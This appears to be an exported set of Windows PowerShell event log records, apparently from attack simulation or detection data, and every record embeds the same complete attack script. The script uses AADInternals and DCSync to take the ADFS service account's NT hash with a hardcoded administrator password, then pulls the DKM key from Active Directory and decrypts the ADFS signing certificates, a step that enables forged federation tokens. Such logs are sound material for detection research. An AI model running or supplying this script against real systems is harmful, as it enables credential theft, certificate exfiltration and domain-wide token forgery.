{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 20:04:21.6759081"},"EventRecordID":"1051","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Registry, Started, \tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=9d272188-72f7-4f70-bc40-ab09db19f554\r\n\tHostApplication=powershell.exe &amp; {Import-Module ActiveDirectory -Force \r\nImport-Module AADInternals -Force | Out-Null\r\n#Get Configuration\r\n$dcServerName = (Get-ADDomainController).HostName\r\n$svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq \"adfs_svc\"\r\n$PWord = ConvertTo-SecureString -String \"ReallyStrongPassword\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList Administrator, $PWord\r\n# use DCSync to fetch the ADFS service account's NT hash\r\n$hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex\r\n$ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server sts.contoso.com\r\n# Get certificates decryption key\r\n$Configuration = [xml]$ADFSConfig\r\n$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group\r\n$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName\r\n$parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn\r\n$base = \"LDAP://CN=$group,$container,$parent\"\r\n$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))\r\n$ADSearch.Filter = '(name=CryptoPolicy)'\r\n$ADSearch.PropertiesToLoad.Clear()\r\n$ADSearch.PropertiesToLoad.Add(\"displayName\") | Out-Null\r\n$aduser = $ADSearch.FindOne()\r\n$keyObjectGuid = $ADUser.Properties[\"displayName\"] \r\n$ADSearch.PropertiesToLoad.Clear()\r\n$ADSearch.PropertiesToLoad.Add(\"thumbnailphoto\") | Out-Null\r\n$ADSearch.Filter=\"(l=$keyObjectGuid)\"\r\n$aduser=$ADSearch.FindOne() \r\n$key=[byte[]]$aduser.Properties[\"thumbnailphoto\"][0] \r\n# Get encrypted certificates from configuration and decrypt them\r\nExport-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key\r\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\r\nWrite-Host \"`nCertificates retrieved successfully\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 20:04:21.7064690"},"EventRecordID":"1052","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Alias, Started, \tProviderName=Alias\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=3\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=9d272188-72f7-4f70-bc40-ab09db19f554\r\n\tHostApplication=powershell.exe &amp; {Import-Module ActiveDirectory -Force \r\nImport-Module AADInternals -Force | Out-Null\r\n#Get Configuration\r\n$dcServerName = (Get-ADDomainController).HostName\r\n$svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq \"adfs_svc\"\r\n$PWord = ConvertTo-SecureString -String \"ReallyStrongPassword\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList Administrator, $PWord\r\n# use DCSync to fetch the ADFS service account's NT hash\r\n$hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex\r\n$ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server sts.contoso.com\r\n# Get certificates decryption key\r\n$Configuration = [xml]$ADFSConfig\r\n$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group\r\n$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName\r\n$parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn\r\n$base = \"LDAP://CN=$group,$container,$parent\"\r\n$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))\r\n$ADSearch.Filter = '(name=CryptoPolicy)'\r\n$ADSearch.PropertiesToLoad.Clear()\r\n$ADSearch.PropertiesToLoad.Add(\"displayName\") | Out-Null\r\n$aduser = $ADSearch.FindOne()\r\n$keyObjectGuid = $ADUser.Properties[\"displayName\"] \r\n$ADSearch.PropertiesToLoad.Clear()\r\n$ADSearch.PropertiesToLoad.Add(\"thumbnailphoto\") | Out-Null\r\n$ADSearch.Filter=\"(l=$keyObjectGuid)\"\r\n$aduser=$ADSearch.FindOne() \r\n$key=[byte[]]$aduser.Properties[\"thumbnailphoto\"][0] \r\n# Get encrypted certificates from configuration and decrypt them\r\nExport-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key\r\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\r\nWrite-Host \"`nCertificates retrieved successfully\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 20:04:21.7064690"},"EventRecordID":"1053","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Environment, Started, \tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=5\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=9d272188-72f7-4f70-bc40-ab09db19f554\r\n\tHostApplication=powershell.exe &amp; {Import-Module ActiveDirectory -Force \r\nImport-Module AADInternals -Force | Out-Null\r\n#Get Configuration\r\n$dcServerName = (Get-ADDomainController).HostName\r\n$svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq \"adfs_svc\"\r\n$PWord = ConvertTo-SecureString -String \"ReallyStrongPassword\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList Administrator, $PWord\r\n# use DCSync to fetch the ADFS service account's NT hash\r\n$hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex\r\n$ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server sts.contoso.com\r\n# Get certificates decryption key\r\n$Configuration = [xml]$ADFSConfig\r\n$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group\r\n$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName\r\n$parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn\r\n$base = \"LDAP://CN=$group,$container,$parent\"\r\n$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))\r\n$ADSearch.Filter = '(name=CryptoPolicy)'\r\n$ADSearch.PropertiesToLoad.Clear()\r\n$ADSearch.PropertiesToLoad.Add(\"displayName\") | Out-Null\r\n$aduser = $ADSearch.FindOne()\r\n$keyObjectGuid = $ADUser.Properties[\"displayName\"] \r\n$ADSearch.PropertiesToLoad.Clear()\r\n$ADSearch.PropertiesToLoad.Add(\"thumbnailphoto\") | Out-Null\r\n$ADSearch.Filter=\"(l=$keyObjectGuid)\"\r\n$aduser=$ADSearch.FindOne() \r\n$key=[byte[]]$aduser.Properties[\"thumbnailphoto\"][0] \r\n# Get encrypted certificates from configuration and decrypt them\r\nExport-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key\r\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\r\nWrite-Host \"`nCertificates retrieved successfully\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 20:04:21.7064690"},"EventRecordID":"1054","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"FileSystem, Started, \tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=7\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=9d272188-72f7-4f70-bc40-ab09db19f554\r\n\tHostApplication=powershell.exe &amp; {Import-Module ActiveDirectory -Force \r\nImport-Module AADInternals -Force | Out-Null\r\n#Get Configuration\r\n$dcServerName = (Get-ADDomainController).HostName\r\n$svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq \"adfs_svc\"\r\n$PWord = ConvertTo-SecureString -String \"ReallyStrongPassword\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList Administrator, $PWord\r\n# use DCSync to fetch the ADFS service account's NT hash\r\n$hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex\r\n$ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server sts.contoso.com\r\n# Get certificates decryption key\r\n$Configuration = [xml]$ADFSConfig\r\n$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group\r\n$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName\r\n$parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn\r\n$base = \"LDAP://CN=$group,$container,$parent\"\r\n$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))\r\n$ADSearch.Filter = '(name=CryptoPolicy)'\r\n$ADSearch.PropertiesToLoad.Clear()\r\n$ADSearch.PropertiesToLoad.Add(\"displayName\") | Out-Null\r\n$aduser = $ADSearch.FindOne()\r\n$keyObjectGuid = $ADUser.Properties[\"displayName\"] \r\n$ADSearch.PropertiesToLoad.Clear()\r\n$ADSearch.PropertiesToLoad.Add(\"thumbnailphoto\") | Out-Null\r\n$ADSearch.Filter=\"(l=$keyObjectGuid)\"\r\n$aduser=$ADSearch.FindOne() \r\n$key=[byte[]]$aduser.Properties[\"thumbnailphoto\"][0] \r\n# Get encrypted certificates from configuration and decrypt them\r\nExport-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key\r\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\r\nWrite-Host \"`nCertificates retrieved successfully\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 20:04:21.7064690"},"EventRecordID":"1055","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Function, Started, \tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=9\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=9d272188-72f7-4f70-bc40-ab09db19f554\r\n\tHostApplication=powershell.exe &amp; {Import-Module ActiveDirectory -Force \r\nImport-Module AADInternals -Force | Out-Null\r\n#Get Configuration\r\n$dcServerName = (Get-ADDomainController).HostName\r\n$svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq \"adfs_svc\"\r\n$PWord = ConvertTo-SecureString -String \"ReallyStrongPassword\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList Administrator, $PWord\r\n# use DCSync to fetch the ADFS service account's NT hash\r\n$hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex\r\n$ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server sts.contoso.com\r\n# Get certificates decryption key\r\n$Configuration = [xml]$ADFSConfig\r\n$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group\r\n$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName\r\n$parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn\r\n$base = \"LDAP://CN=$group,$container,$parent\"\r\n$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))\r\n$ADSearch.Filter = '(name=CryptoPolicy)'\r\n$ADSearch.PropertiesToLoad.Clear()\r\n$ADSearch.PropertiesToLoad.Add(\"displayName\") | Out-Null\r\n$aduser = $ADSearch.FindOne()\r\n$keyObjectGuid = $ADUser.Properties[\"displayName\"] \r\n$ADSearch.PropertiesToLoad.Clear()\r\n$ADSearch.PropertiesToLoad.Add(\"thumbnailphoto\") | Out-Null\r\n$ADSearch.Filter=\"(l=$keyObjectGuid)\"\r\n$aduser=$ADSearch.FindOne() \r\n$key=[byte[]]$aduser.Properties[\"thumbnailphoto\"][0] \r\n# Get encrypted certificates from configuration and decrypt them\r\nExport-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key\r\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\r\nWrite-Host \"`nCertificates retrieved successfully\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 20:04:21.7238517"},"EventRecordID":"1056","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Variable, Started, \tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=11\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=9d272188-72f7-4f70-bc40-ab09db19f554\r\n\tHostApplication=powershell.exe &amp; {Import-Module ActiveDirectory -Force \r\nImport-Module AADInternals -Force | Out-Null\r\n#Get Configuration\r\n$dcServerName = (Get-ADDomainController).HostName\r\n$svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq \"adfs_svc\"\r\n$PWord = ConvertTo-SecureString -String \"ReallyStrongPassword\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList Administrator, $PWord\r\n# use DCSync to fetch the ADFS service account's NT hash\r\n$hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex\r\n$ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server sts.contoso.com\r\n# Get certificates decryption key\r\n$Configuration = [xml]$ADFSConfig\r\n$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group\r\n$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName\r\n$parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn\r\n$base = \"LDAP://CN=$group,$container,$parent\"\r\n$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))\r\n$ADSearch.Filter = '(name=CryptoPolicy)'\r\n$ADSearch.PropertiesToLoad.Clear()\r\n$ADSearch.PropertiesToLoad.Add(\"displayName\") | Out-Null\r\n$aduser = $ADSearch.FindOne()\r\n$keyObjectGuid = $ADUser.Properties[\"displayName\"] \r\n$ADSearch.PropertiesToLoad.Clear()\r\n$ADSearch.PropertiesToLoad.Add(\"thumbnailphoto\") | Out-Null\r\n$ADSearch.Filter=\"(l=$keyObjectGuid)\"\r\n$aduser=$ADSearch.FindOne() \r\n$key=[byte[]]$aduser.Properties[\"thumbnailphoto\"][0] \r\n# Get encrypted certificates from configuration and decrypt them\r\nExport-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key\r\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\r\nWrite-Host \"`nCertificates retrieved successfully\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"400"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 20:04:21.9425015"},"EventRecordID":"1057","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Available, None, \tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=9d272188-72f7-4f70-bc40-ab09db19f554\r\n\tHostApplication=powershell.exe &amp; {Import-Module ActiveDirectory -Force \r\nImport-Module AADInternals -Force | Out-Null\r\n#Get Configuration\r\n$dcServerName = (Get-ADDomainController).HostName\r\n$svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq \"adfs_svc\"\r\n$PWord = ConvertTo-SecureString -String \"ReallyStrongPassword\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList Administrator, $PWord\r\n# use DCSync to fetch the ADFS service account's NT hash\r\n$hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex\r\n$ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server sts.contoso.com\r\n# Get certificates decryption key\r\n$Configuration = [xml]$ADFSConfig\r\n$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group\r\n$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName\r\n$parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn\r\n$base = \"LDAP://CN=$group,$container,$parent\"\r\n$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))\r\n$ADSearch.Filter = '(name=CryptoPolicy)'\r\n$ADSearch.PropertiesToLoad.Clear()\r\n$ADSearch.PropertiesToLoad.Add(\"displayName\") | Out-Null\r\n$aduser = $ADSearch.FindOne()\r\n$keyObjectGuid = $ADUser.Properties[\"displayName\"] \r\n$ADSearch.PropertiesToLoad.Clear()\r\n$ADSearch.PropertiesToLoad.Add(\"thumbnailphoto\") | Out-Null\r\n$ADSearch.Filter=\"(l=$keyObjectGuid)\"\r\n$aduser=$ADSearch.FindOne() \r\n$key=[byte[]]$aduser.Properties[\"thumbnailphoto\"][0] \r\n# Get encrypted certificates from configuration and decrypt them\r\nExport-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key\r\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\r\nWrite-Host \"`nCertificates retrieved successfully\"}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=0ba1fc3d-9caf-426c-8d74-993b300be0e2\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 20:04:17.6145549"},"EventRecordID":"1058","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Certificate, Started, \tProviderName=Certificate\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=15\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=9d272188-72f7-4f70-bc40-ab09db19f554\r\n\tHostApplication=powershell.exe &amp; {Import-Module ActiveDirectory -Force \r\nImport-Module AADInternals -Force | Out-Null\r\n#Get Configuration\r\n$dcServerName = (Get-ADDomainController).HostName\r\n$svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq \"adfs_svc\"\r\n$PWord = ConvertTo-SecureString -String \"ReallyStrongPassword\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList Administrator, $PWord\r\n# use DCSync to fetch the ADFS service account's NT hash\r\n$hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex\r\n$ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server sts.contoso.com\r\n# Get certificates decryption key\r\n$Configuration = [xml]$ADFSConfig\r\n$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group\r\n$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName\r\n$parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn\r\n$base = \"LDAP://CN=$group,$container,$parent\"\r\n$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))\r\n$ADSearch.Filter = '(name=CryptoPolicy)'\r\n$ADSearch.PropertiesToLoad.Clear()\r\n$ADSearch.PropertiesToLoad.Add(\"displayName\") | Out-Null\r\n$aduser = $ADSearch.FindOne()\r\n$keyObjectGuid = $ADUser.Properties[\"displayName\"] \r\n$ADSearch.PropertiesToLoad.Clear()\r\n$ADSearch.PropertiesToLoad.Add(\"thumbnailphoto\") | Out-Null\r\n$ADSearch.Filter=\"(l=$keyObjectGuid)\"\r\n$aduser=$ADSearch.FindOne() \r\n$key=[byte[]]$aduser.Properties[\"thumbnailphoto\"][0] \r\n# Get encrypted certificates from configuration and decrypt them\r\nExport-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key\r\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\r\nWrite-Host \"`nCertificates retrieved successfully\"}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=0ba1fc3d-9caf-426c-8d74-993b300be0e2\r\n\tPipelineId=2\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"403"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-27 20:04:18.2938084"},"EventRecordID":"1059","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Stopped, Available, \tNewEngineState=Stopped\r\n\tPreviousEngineState=Available\r\n\r\n\tSequenceNumber=17\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=9d272188-72f7-4f70-bc40-ab09db19f554\r\n\tHostApplication=powershell.exe &amp; {Import-Module ActiveDirectory -Force \r\nImport-Module AADInternals -Force | Out-Null\r\n#Get Configuration\r\n$dcServerName = (Get-ADDomainController).HostName\r\n$svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq \"adfs_svc\"\r\n$PWord = ConvertTo-SecureString -String \"ReallyStrongPassword\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList Administrator, $PWord\r\n# use DCSync to fetch the ADFS service account's NT hash\r\n$hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex\r\n$ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server sts.contoso.com\r\n# Get certificates decryption key\r\n$Configuration = [xml]$ADFSConfig\r\n$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group\r\n$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName\r\n$parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn\r\n$base = \"LDAP://CN=$group,$container,$parent\"\r\n$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))\r\n$ADSearch.Filter = '(name=CryptoPolicy)'\r\n$ADSearch.PropertiesToLoad.Clear()\r\n$ADSearch.PropertiesToLoad.Add(\"displayName\") | Out-Null\r\n$aduser = $ADSearch.FindOne()\r\n$keyObjectGuid = $ADUser.Properties[\"displayName\"] \r\n$ADSearch.PropertiesToLoad.Clear()\r\n$ADSearch.PropertiesToLoad.Add(\"thumbnailphoto\") | Out-Null\r\n$ADSearch.Filter=\"(l=$keyObjectGuid)\"\r\n$aduser=$ADSearch.FindOne() \r\n$key=[byte[]]$aduser.Properties[\"thumbnailphoto\"][0] \r\n# Get encrypted certificates from configuration and decrypt them\r\nExport-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key\r\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\r\nWrite-Host \"`nCertificates retrieved successfully\"}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=0ba1fc3d-9caf-426c-8d74-993b300be0e2\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
